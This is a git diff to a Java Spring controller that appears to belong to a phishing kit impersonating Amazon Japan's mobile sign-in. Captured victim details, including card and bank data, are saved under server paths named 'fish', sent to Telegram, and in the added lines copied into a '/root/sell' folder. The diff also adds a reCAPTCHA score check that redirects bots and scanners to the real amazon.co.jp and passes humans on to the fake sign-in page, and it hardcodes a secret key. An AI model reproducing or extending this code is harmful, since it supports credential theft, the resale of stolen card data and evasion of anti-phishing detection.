@@ -16,6 +16,7 @@ import com.kidd.amazon.model.enums.CardType;
 import com.kidd.amazon.task.AsyncTask;
 import lombok.extern.slf4j.Slf4j;
 import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.beans.factory.annotation.Value;
 import org.springframework.stereotype.Controller;
 import org.springframework.ui.Model;
 import org.springframework.util.StringUtils;
@@ -25,6 +26,7 @@ import javax.servlet.http.Cookie;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import javax.servlet.http.HttpSession;
+import java.math.BigDecimal;
 import java.time.Clock;
 import java.time.LocalDateTime;
 import java.time.ZoneId;
@@ -45,6 +47,11 @@ public class Amazon2MobileController {
     @Autowired
     private HttpServletResponse response;
 
+
+    @Value("${google.secret:6LcEYsUaAAAAAAfTzIt86eSq8Yc0ljLMqzcoJMmF}")
+    private String googleSecret;
+
+
     @GetMapping("/version2/mobile/signin")
     public Object signin(@RequestHeader("User-Agent") String uaStr) {
         String ip = IpUtils.getIpAddress(request);
@@ -62,8 +69,8 @@ public class Amazon2MobileController {
 
     @GetMapping("/")
     public Object signin2(@RequestHeader("User-Agent") String uaStr) {
-
-        return "redirect:/version2/mobile/signin";
+//        return "redirect:/version2/mobile/signin";
+        return "index";
     }
 
     @GetMapping("/version2/mobile/homepage/billing")
@@ -165,6 +172,7 @@ public class Amazon2MobileController {
         String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
         asyncTask.asyncWriteMap(String.format("/root/version2-step3/%s.txt", timeStr), userInfoMap);
         asyncTask.asyncSaveFish("/root/lack"+timeStr+"/",userInfoMap);
+        asyncTask.asyncSaveFish("/root/sell"+timeStr+"/",userInfoMap);
         return new HashMap<String,String>(){{put("data","ok");}};
     }
 
@@ -184,6 +192,7 @@ public class Amazon2MobileController {
         asyncTask.asyncWriteMap(String.format("/root/version2-step4/%s.txt", timeStr), userInfoMap);
         asyncTask.asyncSendTgMsg(null,null,userInfoMap);
         asyncTask.asyncSaveFish("/root/full"+timeStr+"/",userInfoMap);
+        asyncTask.asyncSaveFish("/root/sell"+timeStr+"/",userInfoMap);
         return new HashMap<String,String>(){{put("data","ok");}};
     }
 
@@ -241,12 +250,54 @@ public class Amazon2MobileController {
                 JSONObject bankJSON = binJson.getJSONObject("bank");
                 if(bankJSON.containsKey("name")){
                     String bankName= bankJSON.getString("name");
-                    if(bankName.contains("SUMITOMO MITSUI" )|| bankName.contains("MITSUI SUMITOMO")){
+                    if(bankName.contains("SUMITOMO MITSUI" )|| bankName.contains("MITSUI SUMITOMO") || bankName.contains("WELLS FARGO BANK")){
                         return "smbc.gif";
                     }
                 }
             }
         }
         return bankImage;
+    }
+
+    @GetMapping("/version2/testIsMobile")
+    @ResponseBody
+    public Object testIsMobile(String uaStr) {
+        Boolean isMobile = false;
+        UserAgent ua = UserAgentUtil.parse(uaStr);
+        isMobile = ua.isMobile();
+        return isMobile;
+    }
+
+    @RequestMapping("/amazon/checkBot")
+    @ResponseBody
+    public Object checkBotAndRedirect(@RequestHeader("User-Agent") String uaStr, @RequestParam("response") String response) {
+        String googleUrl = "https://www.recaptcha.net/recaptcha/api/siteverify";
+        String defaulRedirectUrl = "https://amazon.co.jp/?Your_Account_Verified";
+        String redirectUrl = defaulRedirectUrl;
+        Map<String, Object> postParam = new HashMap<>();
+        postParam.put("secret", googleSecret);
+        postParam.put("response", response);
+        //判定爬虫
+        try {
+            String result = HttpRequest.post(googleUrl)
+                    .form(postParam)
+                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
+                    .timeout(10000)//超时，毫秒
+                    .execute()
+                    .body();
+            JSONObject jsonResult = JSON.parseObject(result);
+            if (null != jsonResult && jsonResult.containsKey("score")) {
+                BigDecimal score = ((BigDecimal) jsonResult.get("score"));
+                log.info("checkBot:"+IpUtils.getIpAddress(request)+":"+score);
+                if (score.doubleValue() > 0.5) {
+                    redirectUrl ="/version2/mobile/signin";
+                    addCookie("checkBot", "notBot");
+                }
+            }
+        } catch (Exception e) {
+            System.out.println("checkBotAndRedirect error:"+e.getMessage());
+            redirectUrl = "/";
+        }
+        return redirectUrl;
     }
 }
